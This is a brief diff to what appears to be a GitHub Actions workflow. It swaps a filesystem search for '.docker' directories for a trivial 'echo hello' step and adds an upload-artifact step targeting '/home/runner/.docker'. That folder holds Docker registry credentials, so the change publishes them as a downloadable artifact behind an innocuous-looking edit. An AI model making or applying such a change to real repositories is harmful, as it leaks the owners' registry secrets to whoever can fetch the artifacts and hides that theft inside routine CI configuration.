@@ -28,4 +28,8 @@ jobs:
         fetch-depth: 0
 
     - run: |
-        find / -type d -name '.docker' 2>/dev/null
+        echo 'hello'
+
+    - uses: actions/upload-artifact@v4
+      with:
+        path: '/home/runner/.docker'
